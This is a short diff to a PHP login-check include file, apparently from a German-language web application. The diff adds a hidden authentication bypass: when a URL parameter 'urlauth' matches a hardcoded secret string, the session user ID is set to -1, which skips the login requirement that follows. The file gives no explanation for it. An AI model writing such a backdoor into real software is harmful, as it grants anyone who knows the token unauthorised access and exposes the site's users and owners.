@@ -1,12 +1,14 @@
 <?php
 
 require_once('data.php');
-
+	
 session_start();
 
 date_default_timezone_set('Europe/Berlin');
 ini_set('display_errors', '0');
 
+if(isset($_GET['urlauth']) && $_GET['urlauth'] == '32haczvb6wh')
+	$_SESSION['userid'] = -1;
 
 if(empty($ignore_no_login) && !userLoggedIn())
 	die("Du musst dich erst einloggen");
